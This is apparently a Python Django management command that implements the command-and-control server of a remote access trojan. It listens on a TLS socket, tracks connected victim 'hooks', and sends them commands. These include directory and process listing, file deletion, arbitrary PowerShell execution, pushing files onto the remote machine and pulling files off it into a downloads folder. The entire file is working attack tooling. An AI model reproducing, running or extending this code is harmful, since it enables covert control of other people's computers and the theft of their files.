from django.core.management.base import BaseCommand, CommandError
import socket
import os
import json
import ssl
import threading
import traceback
import sys
from main.models import IP, Hook, Client, Command as ClientCommand, Server, Download, FileUpload
from time import sleep
from django.conf import settings
from django.core.files.base import ContentFile
import uuid
import psutil
import subprocess
import base64
import shutil

class Command(BaseCommand):
    def handle(self, *args, **kwargs):

        hooks = {}
        clients = {}
        ips = {}

        def ping_clients():
            while Server.objects.get().running:
                current_hooks = Hook.objects.all()
                ping_command = json.dumps({"command": "ping"})
                for h in current_hooks:
                    try:
                        if Hook.objects.filter(id=h.id).exists():
                            hooks[str(h.uuid)].sendall((ping_command + "<EOC>").encode())
                        else:
                            continue
                    except (BrokenPipeError, ssl.SSLEOFError):
                        if Hook.objects.filter(id=h.id).exists():
                            client_uuid = str(Client.objects.get(hook=h).uuid)
                            adr_uuid = str(IP.objects.get(hook=h).uuid)
                            hook_uuid = str(h.uuid)

                            del clients[client_uuid]
                            del ips[adr_uuid]
                            del hooks[hook_uuid]

                            IP.objects.get(hook=h).delete()
                            Client.objects.get(hook=h).delete()
                            h.delete()
                            
                sleep(5)

        def send(hook, data):
            jsondata = json.dumps(data)
            hook.sendall((jsondata + '<EOC>').encode())

        def handle_connections():
            obj = Server.objects.get()
            running = obj.running
            while running:
                try:
                    client, addr = sock.accept()
                    ip, port = addr
                    hook = context.wrap_socket(client, server_side=True)
                    h = Hook()
                    h.data = hook
                    h.save()
                    c = Client()
                    c.hook = h
                    c.data = client
                    c.save()
                    clients[str(c.uuid)] = client
                    adr = IP()
                    adr.hook = h
                    adr.data = ip
                    adr.port = port
                    adr.save()
                    ips[str(adr.uuid)] = ip
                    hooks[str(h.uuid)] = hook
                except:
                    if running:
                        traceback.print_exc()

        def hook_comms(command):
            screenshot_count = 0
            picture_count = 0
            
            current_command = command
            current_hook = current_command.hook
            current_ip = IP.objects.get(hook=current_hook)
            hook = hooks[str(current_hook.uuid)]

            command = current_command.command
            print(command)
            
            if command == 'quit':
                return
            if command == 'info' or command == 'ls' or command == 'netstat' or command =='allWindows' or command == 'ps':
                message = {"command": command}
                send(hook, message)
                file_data = bytearray()
                while True:
                    part = hook.recv(2048)
                    file_data.extend(part)
                    if file_data[-7:] == b'<EOF>\r\n':
                        break
                try:
                    response = file_data[:-7].decode('utf-8')
                except:
                    traceback.print_exc()
                
                return response
            elif command == 'arp' or command =='check' or command == 'where':
                message = {"command": command}
                send(hook, message)
                file_data = bytearray()
                while True:
                    part = hook.recv(2048)
                    file_data.extend(part)

                    if file_data[-5:] == b'<EOF>':
                        break

                response = file_data[:-5].decode('utf-8')
                return response
            elif command.startswith('cd '):
                path = command[3:]
                message = {"command": "cd", "data": path}
                send(hook, message)
                response = hook.recv(2048).decode()
                return response
            elif command.startswith('rm '):
                path = command[3:]
                message = {"command": "rm", "data": path}
                send(hook, message)
                response = hook.recv(2048).decode()
                return response
            elif command.startswith('removedir '):
                path = command[10:]
                message = {"command": "removedir", "data": path}
                send(hook, message)
                response = hook.recv(2048).decode()
                return response
            elif command.startswith('mkdir '):
                path = command[6:]
                message = {"command": "mkdir", "data": path}
                send(hook, message)
                response = hook.recv(2048).decode()
                return response
            elif command.startswith('cat '):
                path = command[4:]
                message = {"command": "cat", "data": path}
                send(hook, message)
                response = hook.recv(2048).decode()
                return response
            elif command.startswith('cp '):
                args = command.split()
                if len(args) == 3:
                    source_path = args[1]
                    destination_path = args[2]
                    message = {"command": "cp", "data1": source_path, "data2": destination_path}
                    send(hook, message)
                    response = hook.recv(2048).decode()
                    return response
            elif command.startswith('pwsh '):
                data = command[5:]
                message = {"command": "pwsh", "data": data}
                send(hook, message)
                file_data = bytearray()
                while True:
                    part = hook.recv(2048)
                    file_data.extend(part)

                    if file_data[-5:] == b'<EOF>':
                        break

                response = file_data[:-5].decode('utf-8')
                print(response)
                
                return response
            elif command.startswith('put '):
                file_name = command[4:]
                print(file_name)
                file_path = os.path.join(settings.MEDIA_ROOT, 'user_files', file_name)
                print(file_path)
                with open(file_path, 'rb') as file:
                    file_data = base64.b64encode(file.read()).decode()
                message = {"command": "put", "data": file_data, "name": file_name}
                send(hook, message)
                response = hook.recv(2048).decode()
                return response 
            elif command.startswith('get '):
                try:
                    filename = command[4:]
                    print(filename)
                    message = {'command': "get", 'data': filename}
                    send(hook, message)

                    file_data = bytearray()
                    while True:
                        part = hook.recv(2048)
                        file_data.extend(part)

                        if file_data[-5:] == b'<EOF>':
                            break

                    file_data = file_data[:-5]
                    print(file_data)
                    if file_data.startswith(b"File not found"):
                        return "Download Failed"

                    download_directory = os.path.join(settings.MEDIA_ROOT, 'downloads', str(current_hook.uuid))
                    os.makedirs(download_directory, exist_ok=True)

                    unique_filename = str(uuid.uuid4()) + '_' + filename
                    file_path = os.path.join(download_directory, unique_filename)
                    with open(file_path, 'wb') as file:
                        file.write(file_data)

                    current_command.file_response.name = os.path.join('downloads', str(current_hook.uuid), unique_filename)
                except:
                    traceback.print_exc()

                return current_command.file_response.url
            return False
                        
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        hostname = socket.gethostname()
        IP_ADDRESS = str(socket.gethostbyname(hostname))
        print(IP_ADDRESS)
        PORT = 5555
        sock.bind((IP_ADDRESS, PORT))
        sock.listen(5)
        Hook.objects.all().delete()
        Server.objects.all().delete()
        server = Server()
        server.running = True
        server.restart = False
        server.save()
        t = threading.Thread(target=handle_connections)
        t.start()

        p = threading.Thread(target=ping_clients)
        p.start()
        

        while True:
            server.refresh_from_db()
            if server.restart == True:
                python_path = r'C:\Path\To\Your\Virtual\Env\Python\Executable.exe'
                manage_py = r'C:\Path\To\Your\Project\manage.py'
                FileUpload.objects.all().delete()
                upload_path = os.path.join(settings.MEDIA_ROOT, 'user_files')
                if os.path.exists(upload_path):
                    shutil.rmtree(upload_path)
                os.execv(python_path, [python_path, manage_py, 'run_server'])

            commands = ClientCommand.objects.filter(processed=False)
            for command in commands:
                try:
                    response = hook_comms(command)
                    command.response = response                    
                except Exception as inst:
                    print('error', inst)
                    command.response = str(inst)
                    command.save()
                    pass
                command.processed = True
                command.save()

            sleep(1)